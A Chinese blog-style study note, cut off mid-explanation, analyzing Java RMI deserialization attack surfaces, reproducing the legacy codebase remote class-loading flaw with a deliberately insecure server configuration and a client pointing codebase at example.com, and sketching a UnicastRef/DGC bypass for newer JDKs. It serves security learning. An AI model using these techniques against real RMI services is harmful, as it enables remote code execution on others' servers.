<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff1d092865.png" alt="image-20240524094758471"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff1e1525dc.png" alt="image-20240524094814823"></p>
<p>再往下，发现执行了 <code>call.executeCall()</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff1f2c58d1.png" alt="image-20240524094832683"></p>
<p>其实不管是用户自定义的 stub 还是系统定义的 stub 都会调用这个方法，**<code>executeCall()</code> 是处理网络请求的东西东西，这里也有可能被攻击。**</p>
<p>再往下走，如果调用的远程函数有返回值的话会执行 <code>unmarshalValue</code>，并且获取远程返回值是利用反序列化读出来的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff202d4632.png" alt="image-20240524094848439"></p>
<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>客户端请求服务端的时候，有两个反序列化的点：<code>executeCall()</code> 和最后读取返回值。</p>
<p><code>executeCall()</code> 处理走的是 JRMP 协议，所以<strong>通过 JRMP 进行攻击</strong>就是通过 RMI 自定义的客户端协议进行攻击，攻击的是 stub。</p>
<p><strong>可以是客户端攻击服务端，也可以是服务端攻击客户端。</strong></p>
<h3 id="注册中心回应客户端"><a href="#注册中心回应客户端" class="headerlink" title="注册中心回应客户端"></a>注册中心回应客户端</h3><p>我们之前有说客户端在 <code>IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;);</code> 的时候，需要把 <code>remoteObj</code> 序列化发给注册中心。然后注册中心再反序列化。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff212db602.png" alt="image-20240524094904589"></p>
<p>我们再传入 <code>remoteObj</code> 的时候是 <code>lookup</code>，所以这里也是通过 <code>switch</code> 找到 <code>lookup</code>，这里<strong>其实只要有 <code>readObject</code> 的都可能会被反序列化攻击</strong></p>
<h3 id="服务端回应客户端"><a href="#服务端回应客户端" class="headerlink" title="服务端回应客户端"></a>服务端回应客户端</h3><p>我们之前有说客户端在 <code>System.out.println(remoteObj.sayHello(&quot;hello&quot;));</code> 的时候，需要把 <code>hello</code> 序列化发给服务端。然后服务端再反序列化。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff221bc4c7.png" alt="image-20240524094919374"></p>
<h3 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h3><p>DGC 会在创建远程服务的时候就自动创建 DGC 服务，我们来关注 DGC 服务是在何时、何处产生的。</p>
<p>我们定位到：<code>putTarget()</code>, 这个函数就是在众多七七八八的都创建完之后执行的，把一些东西放在静态表里面，我们可以注意到在 <code>putTarget()</code> 中，有一个 <code>DGCImpl.dgcLog.isLoggable</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff23cdb412.png" alt="image-20240524094946598"></p>
<p>DGC 服务就是在这里创建的，这里是调用了 DGCImpl 类的静态函数，在类的动态加载中我们提到只要调用了类的静态函数就对这个类进行了初始化，因此会执行类的 <code>static</code> 静态代码块</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff24bba4da.png" alt="image-20240524095001306"></p>
<p>在 DGCImpl 的静态代码块里面的 try 里执行了 <code>new DGCImpl()</code>, 再往下看一下 stub 是怎么创建的，其实原理和我们之前分析服务端的 skel 和客户端的 stub 一样，看一下 JDK 是否有 <code>DGCImpl_Stub</code> 这个类，有则反射创建。</p>
<p>在 <code>DGCImpl_Stub</code> 类中有两个方法，<code>clean</code> 和 <code>dirty</code>。这两个函数都有我们之前说过比较危险的地方：**<code>readObject</code> 和 <code>invoke</code>**</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff25c2a7e3.png" alt="image-20240524095017821"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff26ad3c0f.png" alt="image-20240524095032373"></p>
<p>因此存在被攻击的风险。<br><code>DGCImpl_Skel</code> 也是同理，也存在危险的地方</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff27a76f4e.png" alt="image-20240524095048037"></p>
<h2 id="RMI-攻击利用"><a href="#RMI-攻击利用" class="headerlink" title="RMI 攻击利用"></a>RMI 攻击利用</h2><h3 id="低版本jdk"><a href="#低版本jdk" class="headerlink" title="低版本jdk"></a>低版本jdk</h3><p>上面我们审计的是8u65的版本 实际上相对很老 </p>
<p>攻击面也如上 哪儿哪儿都可以进行攻击</p>
<p>具体怎么攻击我还没有找到相应的学习资料 等学完反序列化这部分应该对怎么利用更清楚一点 好像是会用到cc链来</p>
<p>这里我讲讲一个更低版本的利用：</p>
<h4 id="简单利用"><a href="#简单利用" class="headerlink" title="简单利用"></a>简单利用</h4><p>先阐述一些简单的利用吧 但这个利用没有什么价值：</p>
<p>首先，RMI Registry是一个远程对象管理的地方，可以理解为一个远程对象的“后台”。我们可以尝试直</p>
<p>接访问“后台”功能，比如修改远程服务器上Hello对应的对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">Naming.rebind(<span class="string">&quot;rmi://192.168.135.142:1099/Hello&quot;</span>, h);</span><br></pre></td></tr></table></figure>

<p>却爆出了这样的错误：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f022a0ee66.png" alt="image-20240520161350985"></p>
<p>原来Java对远程访问RMI Registry做了限制，只有来源地址是localhost的时候，才能调用rebind、bind、unbind等方法。</p>
<p>不过list和lookup方法可以远程调用。</p>
<p>list方法可以列出目标上所有绑定的对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] s = Naming.list(<span class="string">&quot;rmi://192.168.135.142:1099&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>lookup作用就是获得某个远程对象。</p>
<p>那么，只要目标服务器上存在一些危险方法，我们通过RMI就可以对其进行调用，之前曾经有一个<a target="_blank" rel="noopener" href="https://github.com/NickstaDB/BaRMIe">工具</a>，其中一个功能就是进行危险方法的探测。</p>
<p>怎么说呢 这个利用嗯。。。</p>
<h4 id="更低版本的利用"><a href="#更低版本的利用" class="headerlink" title="更低版本的利用"></a>更低版本的利用</h4><p>曾经有段时间，Java是可以运行在浏览器中的，对，就是Applet这个奇葩。在使用Applet的时候通常需要指定一个codebase属性，比如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;applet code=<span class="string">&quot;HelloWorld.class&quot;</span> codebase=<span class="string">&quot;Applets&quot;</span> width=<span class="string">&quot;800&quot;</span> height=<span class="string">&quot;600&quot;</span>&gt;</span><br><span class="line">&lt;/applet&gt;</span><br></pre></td></tr></table></figure>

<p>除了Applet，RMI中也存在远程加载的场景，也会涉及到codebase。</p>
<p><code>codebase</code>是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的<code>CLASSPATH</code>，但<code>CLASSPATH</code>是本地路径，而<code>codebase</code>通常是远程URL，比如http、ftp等。</p>
<p>如果我们指定 <code>codebase=http://example.com/</code> ，然后加载 <code>org.vulhub.example.Example</code> 类，则Java虚拟机会下载这个文件 <code>http://example.com/org/vulhub/example/Example.class </code>，并作为Example类的字节码。</p>
<p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的<code>CLASSPATH</code>下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载<code>codebase</code>中的类。</p>
<p>这个时候问题就来了，如果codebase被控制，我们不就可以加载恶意类了吗？</p>
<p>对，在RMI中，我们是可以将<code>codebase</code>随着序列化数据一起传输的，服务器在接收到这个数据后就会去<code>CLASSPATH</code>和指定的<code>codebase</code>寻找类，由于<code>codebase</code>被控制导致任意命令执行漏洞。</p>
<p>不过显然官方也注意到了这一个安全隐患，所以只有满足如下条件的RMI服务器才能被攻击：</p>
<ul>
<li><p>安装并配置了<code>SecurityManager</code></p>
</li>
<li><p>Java版本<strong>低于7u21、6u45</strong>，或者设置了 <code>java.rmi.server.useCodebaseOnly=false</code></p>
</li>
</ul>
<p>其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html</span><br><span class="line"></span><br><span class="line">https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</span><br></pre></td></tr></table></figure>

<p>官方将 <code>java.rmi.server.useCodebaseOnly</code> 的默认值由 false 改为了 true 。在</p>
<p>java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的</p>
<p>codebase ，不再支持从RMI请求中获取。</p>
<p>我们来编写一个简单的RMIServer用于复现这个漏洞。建立4个文件：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ICalc.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICalc</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Calc.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">ICalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Integer param : params) &#123;</span><br><span class="line">        sum += param;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RemoteRMIServer.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;setup SecurityManager&quot;</span>);</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">SecurityManager</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Calc</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calc</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;refObj&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RemoteRMIServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// client.policy</span></span><br><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>同样 这里我也是n合一了</p>
<p>编译运行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac *.java</span><br><span class="line">java -Djava.rmi.server.hostname=<span class="number">192.168</span><span class="number">.135</span><span class="number">.142</span> - Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.security.policy=client.policy</span><br><span class="line">RemoteRMIServer</span><br></pre></td></tr></table></figure>

<p>其中， <code>java.rmi.server.hostname</code> 是服务器的IP地址，远程调用时需要根据这个值来访问RMI-Server。</p>
<p>然后，我们再建立一个RMIClient.java：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">r</span> <span class="operator">=</span> (ICalc)</span><br><span class="line">            Naming.lookup(<span class="string">&quot;rmi://192.168.135.142:1099/refObj&quot;</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">Payload</span>();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIClient</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个Client我们需要在另一个位置运行，因为我们需要让RMI Server在本地CLASSPATH里找不到类，才会去加载codebase中的类，所以不能将RMIClient.java放在RMI Server所在的目录中。</p>
<p>运行RMIClient：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -</span><br><span class="line">Djava.rmi.server.codebase=http:<span class="comment">//example.com/ RMIClient</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f022b5d90e.png" alt="image-20240520162730395"></p>
<p>查看example.com的日志，可见收到了来自Java的请求 &#x2F;RMIClient$Payload.class 。因为我们还没有实际放置这个类文件，所以上面出现了异常：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f021ce18c3.png" alt="image-20240520162813421"></p>
<p>我们只需要编译一个恶意类，将其class文件放置在Web服务器的 &#x2F;RMIClient$Payload.class 即可</p>
<p>这种利用条间比较苛刻</p>
<h3 id="高版本jdk绕过利用"><a href="#高版本jdk绕过利用" class="headerlink" title="高版本jdk绕过利用"></a>高版本jdk绕过利用</h3><p>前面低版本jdk主要利用在<strong>注册中心和DGC</strong></p>
<p>高版本(8u121以上)当然重点对这两个包里的类进行了处理：</p>
<p><strong>Registylmp.java：</strong></p>
<p>具体怎么实现的这里简单说下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f02225600f.png" alt="image-20240520163547140"></p>
<p>这里加了一个函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f022b117ef.png" alt="image-20240520163437984"></p>
<p>这里多加了一个判断：</p>
<p>这个输入流如果是这几个类 才能反序列化</p>
<p><strong>DGClmp.java:</strong></p>
<p>更上面这个差不多 甚至更严重一些：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f021b25346.png" alt="image-20240520163819166"></p>
<p>这里有一个checkInput函数</p>
<p>同样也有if:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f022671685.png" alt="image-20240520163932821"></p>
<p>也是只有这几个类才能反序列化</p>
<p><strong>远程对象直接反序列化</strong></p>
<p>之前不是还用远程对象之间反序列化吗</p>
<p>在高版本下：</p>
<p>这个流程太复杂了 没分析明白 </p>
<p>是必须知道具体参数类型才行(String object这种)</p>
<p>限制很大 </p>
<p>因为：</p>
<p>远程对象直接反序列化： 限制态度 难以利用</p>
<p>DGC: DGC的几个类都是些没有什么功能的类 难以利用</p>
<p>故：</p>
<p>我们只能从注册中心下手（这也是为什么一般都打注册中心的原因）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f021fbaf65.png" alt="image-20240520164609148"></p>
<p>看来看去其实也就两个类可以利用：</p>
<ul>
<li>java.lang.reflect.Proxy.class</li>
<li>UnicastRef.class</li>
</ul>
<p>其他都没什么用</p>
<h4 id="UnicastRef-class"><a href="#UnicastRef-class" class="headerlink" title="UnicastRef.class"></a>UnicastRef.class</h4><p>先说下这个吧 前面我们审过</p>
<p>这个也是最常用的</p>
<p>我们前面分析的时候提到过：</p>
<p>有一个invoke方法</p>
<p>也就是那个**jrmp的一个攻击 ** 所有rmi客户端都会收到攻击</p>
<p>但是他的高版本<strong>只修复服务端的攻击 对客户端的攻击并没有修复</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f021d18cd1.png" alt="image-20240520165549449"></p>
<p>所以接下来我们的思路就是想办法让<strong>服务端来发起一个客户端请求</strong> 这样就会在服务端引起一个反序列化的攻击</p>
<p>invoke是怎么被调用的呢</p>
<p>不就是那几个stub吗</p>
<ul>
<li>RegistyImpl_Stub</li>
<li>DGCImpl_Stub</li>
</ul>
<p>还有一个动态代理 但这个只有在生成创建服务端时才会调用</p>
<p>怎么创建Stub呢</p>
<p>是通过一个函数：<code>createProxy</code></p>
<p>那这个函数在哪里可以调用呢：</p>
<p>注册中心：</p>
<ul>
<li>LocateRegistry-&gt;getRegistry中调用</li>
<li>ActivatableRef-&gt;getStub中调用</li>
<li>UnicastSeverRef-&gt;exportObject中导出时调用</li>
</ul>
<p><strong>注册中心的都没什么用 调用不了</strong></p>
<p>DGC:</p>
<ul>
<li><p>DGCImpl静态代码块中调用（没办法干涉）</p>
</li>
<li><p>DGCClient.EndpointEntry-&gt;EndpointEntry</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f02269df1e.png" alt="image-20240520171348038"></p>
</li>
</ul>
<p>这个才是我们能调用的</p>
<p>在构造函数创建了一个DGC服务</p>
<p>我们无法在一个已经跑起来的程序中来改变代码逻辑 只能是通过反序列化的方式来实现</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f021eed7cc.png" alt="image-20240520171928009"></p>
<p>所以：</p>
<p>以这里做为入口</p>
<p>1.想办法创建一个EndpointEntry类 并生成一个DGC</p>
<p>2.让DGC来发起一个客户端请求</p>
<p>先来第一步：</p>
<p>从EndpointEntry往上找 直到找到一个反序列化的点</p>
<p>find usages</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f022753ab4.png" alt="image-20240520172252101"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f02237a6e4.png" alt="image-20240520172311945"></p>
<p>找到一个lookup  没用</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f022717b27.png" alt="image-20240520172335196"></p>
<p>再往上找</p>
<p>是一个do - while  没用</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f0223b8ad3.png" alt="image-20240520172523613"></p>
<p>再往上找</p>
<p>找到两个地方</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f0224b99eb.png" alt="image-20240520172606829"></p>
<p>有一个是ConnectionInputStream：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f02274acca.png" alt="image-20240520172637021"></p>
<p>另一个点是LiveRef:</p>
<p>一个else里面</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f0227099fa.png" alt="image-20240520172856629"></p>
<p>如果这个输入流不是ConnectionInputStream才会调用</p>
<p>但是整个输入流都是ConnectionInputStream 所以根本调用不了</p>
<p>所以要从ConnectionInputStream往上找</p>
<p>找到在StreamRemoteCall-&gt;releaseStream里面</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f021f1ca47.png" alt="image-20240520173805571"></p>
<p>StreamRemoteCall不觉得熟悉？</p>
<p>这不是jrmp的那个攻击点吗</p>
<p>而releaseStream会创建一个DGC服务</p>
<p>releaseStream在哪儿调的呢</p>
<p>是在RegistryImpl_Skel里面</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f02292867d.png" alt="image-20240520174216954"></p>
<p>到这里流程就通了</p>
<p>Skel不是在服务端吗</p>
<p>那不就是说明我们在服务端找到一个点 能让他创建一个DGC服务</p>
<p>那下一步我们让这个DGC服务发起一个请求就行</p>
<p>注意在registryRefs中有一个if 这是阻挡我们的地方</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f022a0cd70.png" alt="image-20240520174750204"></p>
<p>当他是空的时候就会调用</p>
<p>所以接下来我们再动态调试找怎么才能让他不是空</p>
<p>最后发现：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f0220bfa17.png" alt="image-20240520175106431"></p>
<p>incommingRefTable中的savaRef方法</p>
<p>再调试：</p>
<p>找到刚刚的read方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f0221da108.png" alt="image-20240520175239971"></p>
<p>read函数又是再哪儿调的呢：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f02251c222.png" alt="image-20240520175400558"></p>
<p><strong>readExternal</strong></p>
<p>这个有点像原生类 也就是说在反序列化的时候有这个类也会调用</p>
<p>由此：</p>
<p>1.我们先序列化一个UnicastRef对象</p>
<p>2.在里面保存一个ref</p>
